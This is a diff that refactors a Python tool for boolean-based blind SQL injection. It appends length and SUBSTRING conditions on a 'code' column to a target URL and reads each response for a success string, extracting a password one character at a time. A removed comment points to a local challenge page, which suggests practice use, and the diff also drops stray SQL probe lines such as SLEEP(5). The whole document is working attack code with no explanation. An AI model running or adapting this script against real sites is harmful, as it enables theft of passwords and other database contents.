@@ -4,7 +4,8 @@ import sys
 import time
 
 def checkURL(url, strCheck):
-    #print(url)
+
+    time.sleep(0.2)
     res = requests.get(url)
 
     if strCheck in res.text:
@@ -12,57 +13,47 @@ def checkURL(url, strCheck):
     return False
 
 
-if len(sys.argv) != 5:
-    print("Usage :", sys.argv[0], "<URL>", "<SUCCESS STRING>")
+if len(sys.argv) != 3:
+    print("Usage :", sys.argv[0], '"<URL>"', '"<SUCCESS STRING>"')
     exit(1)
 
-#url = "http://127.0.0.1/trhackers/epreuve14.php"
-#param = id
 url = sys.argv[1]
 msg = sys.argv[2]
-champ = "code"
+col_name = "code"
+
+found = True
+password_size = 1
+password_found = ''
 
 print("[+] URL :", url)
-
-password_size = 0
 print("[+] Checking password size...")
 
-for x in range(1,50):
-
-    result = checkURL(url + " AND length("+ champ +") >= " + str(x), msg)
-    time.sleep(0.2)
-
+while found:
+    found = False
+    result = checkURL(url + f" AND length({col_name}) >= {password_size}", msg)
+    
     if result:
-        password_size = x
         print("[+] Password size : ", password_size, end="\r")
-    else:
-        break
+        password_size += 1
+        found = True
 
 
-alpha = string.printable
-password = ''
+charset = string.printable
 
 print("\n[+] Retrieving password ...")
 
 for x in range(1, password_size + 1):
     found = False
-    time.sleep(0.2)
 
-    for c in alpha:
-        param = " AND SUBSTRING("+ champ +"," + str(x) + ", 1) = '" + c + "'" 
+    for char in charset:
+        param = f" AND SUBSTRING({col_name}, {x}, 1) = '{char}'"
         result = checkURL(url + param, msg)
-        print("[+] Retrieving password :", password + c, end="\r")
+        print("[+] Retrieving password :", password_found + char, end="\r")
 
         if result:
             found = True
-            password += c
-            print("[+] Retrieving password :", password, end="\r")
+            password_found += char
+            print("[+] Retrieving password :", password_found, end="\r")
             break
 
-print("\n[+] Password found :", password)
-
-
-
-SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END;
-
-SELECT SLEEP(5);
+print("\n[+] Password found :", password_found)
